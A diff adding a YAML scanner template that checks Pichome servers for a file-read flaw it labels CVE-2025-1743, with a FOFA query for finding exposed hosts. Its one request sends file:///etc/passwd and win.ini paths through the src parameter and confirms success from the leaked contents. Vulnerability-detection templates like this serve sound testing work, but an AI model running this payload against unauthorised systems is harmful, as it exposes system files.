@@ -1,0 +1,20 @@
+id: poc-yaml-pichome-src-file-read
+info:
+  name: Pichome /index.php 文件读取漏洞（CVE-2025-1743）
+  severity: high
+  tags:
+  - 文件读取
+  - CVE-2025-1743
+  finger: pichome
+  fofa: icon_hash="933976300"
+variables:
+  data: 'file:///etc/passwd
+
+    file:///c://windows/win.ini'
+requests:
+- method: GET
+  path: /index.php?mod=textviewer&src={{.data}}
+  expression: "status_code == 200 &&\n(\ncontains(body, \"bit app support\") && \n\
+    contains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nmatches(body,\
+    \ \"root:.*:0:0:\")\n)\n"
+transport: http
